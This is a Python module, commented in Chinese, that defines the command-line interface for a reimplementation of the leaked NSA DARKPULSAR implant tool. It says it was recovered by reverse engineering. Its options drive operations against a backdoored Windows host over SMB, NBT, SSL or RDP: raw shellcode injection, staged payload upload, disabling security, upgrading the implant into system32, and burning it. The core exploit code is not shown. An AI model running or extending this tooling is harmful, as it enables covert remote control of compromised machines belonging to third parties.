"""darkpulsar — DARKPULSAR 植入物工具。

Python 重写的 NSA Darkpulsar 工具 `Darkpulsar-1.1.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 DAPU 植入物操作流程。
"""

from . import darkpulsar


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def darkpulsar_handle(args):
    """Run the DARKPULSAR exploitation sequence against the supplied host."""
    return darkpulsar.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        ssp_mtu=args.ssp_mtu,
        architecture=args.architecture,
        ssp_fragment_size=args.ssp_fragment_size,
        protocol=args.protocol,
        use_ntlm_ssp_header=args.use_ntlm_ssp_header,
        implant_action=args.implant_action,
        shellcode=args.shellcode,
        new_file=args.new_file,
        write_path=args.write_path,
        ping_pong_buffer_size=args.ping_pong_buffer_size,
        private_key_input_type=args.private_key_input_type,
        sig_private_key=args.sig_private_key,
        private_key_file=args.private_key_file,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `darkpulsar` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "darkpulsar",
        help="DARKPULSAR 植入物工具",
        description="Python 重写的 NSA Darkpulsar (DARKPULSAR) 植入物工具 "
                    "Darkpulsar-1.1.0。通过 SMB/NBT/SSL/RDP 协议与目标主机"
                    "上的 DAPU 植入物通信，执行烧录、shellcode 注入、后门升级"
                    "等操作。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标 DAPU 端口（默认 445）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--ssp-mtu", type=int, metavar="MTU",
        help="SSP MTU 大小（数据分片大小）",
    )
    p.add_argument(
        "--architecture",
        choices=["x86", "x64"],
        default="x86",
        help="目标架构（默认 x86）",
    )
    p.add_argument(
        "--ssp-fragment-size", type=int, default=0,
        metavar="SIZE",
        help="SSP 分片大小（Vista/2k8 建议 480 或更小，默认 0）",
    )
    p.add_argument(
        "--protocol",
        choices=["SMB", "NBT", "SSL", "RDP"],
        default="SMB",
        help="协议类型（默认 SMB）",
    )
    p.add_argument(
        "--use-ntlm-ssp-header", action="store_true", default=True,
        help="在 NTLM 身份验证前添加有效头部（默认启用）",
    )
    p.add_argument(
        "--no-use-ntlm-ssp-header", action="store_false",
        dest="use_ntlm_ssp_header",
        help="禁用 NTLM SSP 头部",
    )
    p.add_argument(
        "--implant-action",
        choices=["Burn", "RawShellcode", "EDFStagedUpload",
                 "DisableSecurity", "EnableSecurity", "UpgradeImplant",
                 "PingPong"],
        default="Burn",
        help="植入物操作类型（默认 Burn）",
    )
    p.add_argument(
        "--shellcode", metavar="HEX",
        help="RawShellcode 模式：shellcode 缓冲区（十六进制）",
    )
    p.add_argument(
        "--new-file", metavar="FILE",
        help="UpgradeImplant 模式：新植入物 DLL 文件路径",
    )
    p.add_argument(
        "--write-path", metavar="PATH",
        default=r"c:\windows\system32\sipauth32.tsp",
        help="UpgradeImplant 模式：目标写入路径（默认 c:\windows\system32\sipauth32.tsp）",
    )
    p.add_argument(
        "--ping-pong-buffer-size", type=int, default=100,
        metavar="SIZE",
        help="PingPong 模式：缓冲区大小（默认 100）",
    )
    p.add_argument(
        "--private-key-input-type",
        choices=["XML", "File"],
        default="XML",
        help="私钥输入类型（默认 XML）",
    )
    p.add_argument(
        "--sig-private-key", metavar="HEX",
        help="XML 模式：签名私钥（十六进制字节）",
    )
    p.add_argument(
        "--private-key-file", metavar="FILE",
        help="File 模式：私钥文件路径",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=darkpulsar_handle)
